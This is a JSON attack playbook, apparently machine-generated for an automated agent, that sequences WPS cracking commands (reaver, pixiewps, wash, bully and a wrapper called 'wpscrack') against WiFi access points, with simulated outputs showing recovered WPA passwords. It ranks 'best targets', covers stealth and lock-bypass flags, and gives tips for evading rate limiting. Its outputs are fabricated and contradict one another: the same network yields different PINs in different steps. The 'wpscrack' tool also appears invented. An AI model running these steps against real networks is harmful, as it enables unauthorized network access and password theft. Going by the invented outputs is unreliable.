{
  "name": "wps_attacks",
  "description": "WPS (WiFi Protected Setup) attacks using Reaver and Pixiewps to recover WPA/WPA2 passwords",
  "pattern": "wps.*attack|reaver|pixiewps|wps.*pin",
  "parameters": [
    "bssid",
    "interface",
    "channel"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "reaver",
        "args": [
          "-i",
          "wlan0mon",
          "-b",
          "DD:EE:FF:00:11:22",
          "-vv"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Reaver v1.6.6 WiFi Protected Setup Attack Tool\nCopyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>\n\n[+] Waiting for beacon from DD:EE:FF:00:11:22\n[+] Switching wlan0mon to channel 6\n[+] Associated with DD:EE:FF:00:11:22 (ESSID: OfficeMain)\n[+] Trying pin \"12345670\"\n[+] Sending authentication request\n[+] Sending association request\n[+] Associated with DD:EE:FF:00:11:22 (ESSID: OfficeMain)\n[+] Sending EAPOL START request\n[+] Received identity request\n[+] Sending identity response\n[+] Received M1 message\n[+] Sending M2 message\n[+] Received M3 message\n[+] Sending M4 message\n[+] Received M5 message\n[+] Sending M6 message\n[+] Received M7 message\n[!] WARNING: Receive timeout occurred\n[+] Trying pin \"12345671\"\n[... testing pins ...]\n[+] Trying pin \"52837648\"\n[+] Sending EAPOL START request\n[+] Received M3 message\n[+] Sending M4 message\n[+] Received M5 message\n[+] Sending M6 message\n[+] Received M7 message\n[+] Sending WSC NACK\n[+] Sending WSC NACK\n[+] Pin cracked in 3 hours 47 minutes\n\n[+] WPS PIN: '52837648'\n[+] WPA PSK: 'office2024!'\n[+] AP SSID: 'OfficeMain'\n\nWPS PIN brute force successful!\n  BSSID: DD:EE:FF:00:11:22\n  ESSID: OfficeMain\n  WPS PIN: 52837648\n  WPA Password: office2024!\n  Time: 3 hours 47 minutes\n  \nWPS PIN space: 11,000 possible PINs (with checksum)\n  Without rate limiting: ~3-8 hours\n  With rate limiting: days to weeks\n  \nWPS vulnerabilities:\n  - Only 11,000 PINs due to checksum (not 100,000,000)\n  - PIN reveals WPA password\n  - Cannot be changed without factory reset (usually)\n  \nRecovered password can be used for normal WPA authentication"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "reaver",
        "args": [
          "-i",
          "wlan0mon",
          "-b",
          "99:88:77:66:55:44",
          "-c",
          "1",
          "-vv",
          "-K",
          "1"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Reaver v1.6.6 WiFi Protected Setup Attack Tool\n\n[+] Waiting for beacon from 99:88:77:66:55:44\n[+] Switching wlan0mon to channel 1\n[+] Associated with 99:88:77:66:55:44 (ESSID: GuestNet)\n[+] Trying pin \"12345670\"\n[+] Sending authentication request\n[+] Sending association request\n[+] Associated with 99:88:77:66:55:44 (ESSID: GuestNet)\n[+] Sending EAPOL START request\n[+] Received identity request\n[+] Sending identity response\n[+] Received M1 message\n[+] Received M3 message\n[+] Running pixiewps attack (-K 1 option)\n\nPixiewps 1.4.2\n\n[Pixie-Dust Attack]\n[*] Seed N1: 0x1a2b3c4d5e6f\n[*] Seed ES1: 0x7a8b9c0d1e2f\n[*] PSK1: 9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c\n[*] PSK2: 3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f\n[*] ES1: 2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e\n[*] ES2: 8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c\n[+] WPS PIN: '83014554'\n[+] WPA PSK: 'GuestPass123'\n\nPixie Dust attack successful!\n  Target: 99:88:77:66:55:44 (GuestNet)\n  Method: Pixie Dust (offline attack)\n  WPS PIN: 83014554\n  WPA Password: GuestPass123\n  Time: ~30 seconds (vs 3+ hours for brute force)\n  \nPixie Dust vulnerability:\n  - Weak random number generator in some routers\n  - PIN can be calculated from M1/M3 messages\n  - No brute force needed\n  - Works instantly on vulnerable routers\n  \nVulnerable vendors:\n  - Many Realtek chipsets\n  - Ralink devices\n  - Some Broadcom\n  - TP-Link (older models)\n  - Netgear (some models)\n  \nNon-vulnerable: Properly implemented WPS with strong RNG"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "wash",
        "args": [
          "-i",
          "wlan0mon",
          "-C"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID\n--------------------------------------------------------------------------------\nAA:BB:CC:DD:EE:FF    6  -42  2.0  No   Cisco     CorporateWiFi\n11:22:33:44:55:66   11  -67  2.0  Yes  Netgear   HomeNetwork        [WPS Locked]\n DD:EE:FF:00:11:22    6  -38  2.0  No   Linksys   OfficeMain\n99:88:77:66:55:44    1  -73  1.0  No   TP-Link   GuestNet\n55:66:77:88:99:AA    6  -81  2.0  No   Realtek   BackupWiFi\n\nWPS status enumeration:\n  5 networks with WPS enabled\n  \nWPS Lock status:\n  - Locked (Yes): WPS temporarily disabled due to failed attempts\n    * HomeNetwork: Currently locked\n    * Wait 24 hours or reboot router\n  \n  - Not Locked (No): WPS active and vulnerable\n    * CorporateWiFi, OfficeMain, GuestNet, BackupWiFi\n    * Can attempt Pixie Dust or brute force\n  \nBest targets for WPS attack:\n  1. GuestNet (WPS 1.0, TP-Link - likely Pixie Dust vulnerable)\n  2. BackupWiFi (Realtek - high Pixie Dust success rate)\n  3. OfficeMain (WPS 2.0 but not locked)\n  \nAvoid: HomeNetwork (locked - wait or skip)"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "reaver",
        "args": [
          "-i",
          "wlan0mon",
          "-b",
          "DD:EE:FF:00:11:22",
          "-c",
          "6",
          "-vv",
          "-L",
          "-N",
          "-d",
          "0",
          "-T",
          "0.5",
          "-r",
          "3:15"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Reaver v1.6.6 WiFi Protected Setup Attack Tool\n\nAdvanced options enabled:\n  -L: Ignore locked state warnings\n  -N: Don't send NACK messages (stealth)\n  -d 0: No delay between attempts (aggressive)\n  -T 0.5: Timeout set to 0.5 seconds\n  -r 3:15: Retry 3 attempts every 15 seconds on failure\n\n[+] Waiting for beacon from DD:EE:FF:00:11:22\n[+] Associated with DD:EE:FF:00:11:22 (ESSID: OfficeMain)\n[+] Max retries/attempts: 3/15\n[+] Trying pin \"12345670\"\n[+] Received M1 message\n[+] Sending M2 message\n[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking\n[+] Associated with DD:EE:FF:00:11:22 (ESSID: OfficeMain)\n[+] Trying pin \"12345671\"\n[... faster attempts ...]\n[+] Trying pin \"35247892\"\n[+] Received M7 message\n[!] AP appears to have WPS disabled or is rate limiting\n[+] Waiting 60 seconds before next attempt\n\nAggressive mode with optimizations:\n  -L: Bypass lock detection (risk: trigger actual lock)\n  -N: No NACK (faster, less detectable)\n  -d 0: No artificial delay\n  -T 0.5: Short timeout (faster)\n  -r 3:15: Smart retry logic\n  \nRate limiting detected:\n  Router is slowing down responses\n  Reaver auto-adjusts timing\n  Attack continues but slower\n  \nTips for rate-limited APs:\n  - Use -d 15 (15 second delay)\n  - Try at night (less network activity)\n  - Wait for automatic WPS unlock (24 hours)\n  - Consider Pixie Dust first (offline, no rate limit)"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "pixiewps",
        "args": [
          "-e",
          "2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
          "-s",
          "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
          "-z",
          "3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c",
          "-a",
          "4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d",
          "-n",
          "5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Pixiewps 1.4.2\n\n[Pixie-Dust Attack]\n\n[*] Mode:     3 (RTL819x)\n[*] Seed N1:  0x1a2b3c4d5e6f\n[*] Seed ES1: 0x7a8b9c0d1e2f\n[*] PSK1:     9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c\n[*] PSK2:     3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f\n[*] ES1:      2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e\n[*] ES2:      8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c\n[*] Authkey:  9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8b\n\n[+] WPS PIN:  17893452\n[+] Time:     0.32 seconds\n\nStandalone Pixiewps attack:\n  Input: WPS handshake data (from airodump-ng or reaver)\n    -e: PKE (Enrollee public key)\n    -s: PKR (Registrar public key)\n    -z: E-Hash1\n    -a: E-Hash2\n    -n: E-Nonce\n  \n  Output: WPS PIN calculated offline\n  \n  Process:\n    1. Capture WPS M1, M2, M3 messages (using airodump-ng)\n    2. Extract values from capture\n    3. Run pixiewps with extracted values\n    4. Get PIN instantly (no brute force)\n  \n  Time: Sub-second calculation\n  \n  Advantages:\n    - Completely offline (no interaction with AP)\n    - No rate limiting\n    - No AP lockout risk\n    - Instant results\n  \n  Requirements:\n    - Vulnerable router (weak RNG)\n    - Capture of WPS handshake"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bully",
        "args": [
          "-b",
          "DD:EE:FF:00:11:22",
          "-c",
          "6",
          "wlan0mon",
          "-v",
          "3"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Bully v1.4 - WPS vulnerability assessment utility\n[+] Switching interface 'wlan0mon' to channel 6\n[+] Scanning for beacon from 'DD:EE:FF:00:11:22' on channel 6\n[+] Waiting for beacon...\n[+] Beacon found!\n[+] MAC address : DD:EE:FF:00:11:22\n[+] ESSID       : OfficeMain\n[+] Channel     : 6\n[+] WPS state   : Configured\n[+] WPS version : 2.0\n[+] Auth types  : WPA2PSK\n[+] Encr types  : CCMP\n[+] Starting WPS association attack...\n[+] Sending authentication request\n[+] Authenticated\n[+] Sending association request\n[+] Associated!\n[+] Received identity request\n[+] Sending identity response\n[+] Received WPS message 'M1'\n[+] Sending WPS message 'M2'\n[+] Received WPS message 'M3'\n[+] Sending WPS message 'M4'\n[+] Received WPS message 'M5'\n[+] Sending WPS message 'M6'\n[+] Received WPS message 'M7'\n[!] Got WPS message 7 with NACK\n[!] [1/11000] Trying PIN: 00000000\n[... PIN testing ...]\n[+] [523/11000] Trying PIN: 52300047\n[!] Detected AP rate limit, backing off...\n[+] [524/11000] Trying PIN: 52300054\n[... continued testing ...]\n[+] [7842/11000] Trying PIN: 78423891\n[+] Received WPS message 7 with valid HMAC\n[+] PIN successfully cracked!\n\n[+] PIN: '78423891'\n[+] Attempting to retrieve WPA password with PIN...\n[+] Authenticated\n[+] Associated!\n[+] Received identity request\n[+] Sending M2 with PIN\n[+] Received M7 with config\n\n[+] WPA-PSK: 'office2024!'\n\nBully (alternative to Reaver):\n  Target: DD:EE:FF:00:11:22 (OfficeMain)\n  WPS PIN: 78423891\n  WPA Password: office2024!\n  Attempts: 7,842 of 11,000 (71% complete)\n  \nBully features:\n  - More robust than Reaver\n  - Better rate limit handling\n  - Verbose mode (-v 3) shows detailed progress\n  - Automatic association retry\n  - Smart PIN testing order\n  \nBully vs Reaver:\n  - Bully: Better stability, newer development\n  - Reaver: More features, Pixie Dust integration\n  - Both: Same WPS attack principle\n  \nUse Bully when:\n  - Reaver fails or crashes\n  - Need better rate limit handling\n  - Want detailed progress output"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "wpscrack",
        "args": [
          "-i",
          "wlan0mon",
          "-b",
          "AA:BB:CC:DD:EE:FF",
          "--pixie-dust",
          "--reaver-fallback"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[*] wpscrack - Automated WPS attack wrapper\n[*] Target: AA:BB:CC:DD:EE:FF (CorporateWiFi)\n[*] Channel: 6\n\n[+] Step 1: Attempting Pixie Dust attack...\n[*] Running: reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1\n[+] Associated with AA:BB:CC:DD:EE:FF\n[+] Received M1 message\n[+] Received M3 message\n[+] Running pixiewps...\n[-] Pixie Dust attack failed (not vulnerable)\n\n[+] Step 2: Falling back to standard PIN brute force...\n[*] Running: reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -N -L\n[+] Associated with AA:BB:CC:DD:EE:FF\n[+] Starting PIN enumeration...\n[+] Trying pin \"12345670\"\n[... brute force in progress ...]\n[+] ETA: 2 hours 34 minutes at current rate\n[!] Rate limiting detected, adjusting timing...\n[+] New ETA: 4 hours 12 minutes\n\nAutomated WPS attack wrapper:\n  1. Try Pixie Dust first (fast, offline)\n  2. If Pixie fails, fallback to brute force\n  3. Auto-adjust for rate limiting\n  4. Resume capability\n  \nwpscrack advantages:\n  - Automated best-practice approach\n  - Tries fastest method first\n  - Falls back intelligently\n  - Progress tracking\n  - Session saving/resuming\n  \nTypical attack flow:\n  1. Pixie Dust attempt (30 seconds)\n     - Success: Get PIN immediately\n     - Fail: Continue to step 2\n  \n  2. Brute force (2-8 hours)\n     - Test all 11,000 PINs\n     - Handle rate limiting\n     - Resume if interrupted"
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
